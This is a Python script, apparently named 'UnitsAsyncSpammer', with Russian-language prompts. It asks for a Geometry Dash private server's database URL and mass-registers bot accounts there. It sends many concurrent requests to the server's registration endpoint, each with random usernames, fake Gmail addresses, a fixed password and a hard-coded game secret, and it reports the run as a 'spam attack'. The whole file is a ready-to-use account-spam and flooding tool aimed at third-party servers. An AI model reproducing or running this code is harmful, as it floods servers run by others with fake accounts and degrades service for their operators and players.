import aiohttp
import requests
import random
import string
import asyncio
import time
from colorama import init, Fore


init()
start_time = time.time()

async def CreateAccount(Username):
    Letters = string.ascii_lowercase
    Email = ''.join(random.choice(Letters) for i in range(12))
    Password = "GDPSMOMENTSPAMMER"
    RandomString = str(random.randint(1, 99999999))
    UserName = Username + RandomString
    Database = DataBase
    data = {
        'userName': UserName,
        'password': Password,
        'email': Email + "@" + "Gmail.com",
        'secret': "Wmfd2893gb7"
    }
    Headers = {'User-Agent': ''}
    async with aiohttp.ClientSession() as session:
        RequestRegister = await session.post(Database+"accounts/registerGJAccount.php", data=data, headers=Headers)
        Info = "Аккаунт был успешно зарегестрирован с именем " + UserName + " И с почта:пароль " + Email + "@" + "Gmail.com" + ":" + str(Password)
        print(Info)

async def main(username, uses: int):
    async with aiohttp.ClientSession() as session:

        tasks = []
        for number in range(1, uses):
            tasks.append(asyncio.ensure_future(CreateAccount(username)))

    Spam = await asyncio.gather(*tasks)

print(Fore.YELLOW + "Вы используете UnitsAsyncSpammer")
DataBase = input(Fore.GREEN + "Введите ссылку на Базу Данных Сервера : ")
UserName = input(Fore.GREEN + "Кастомное имя ботов : ")
Uses = int(input(Fore.GREEN + "Сколько будет ботов : "))

asyncio.run(main(UserName, Uses))
print(Fore.GREEN + "--- %s Секунд ---" % (time.time() - start_time) + "--- Понадобилось для Спам-Аттаки ---")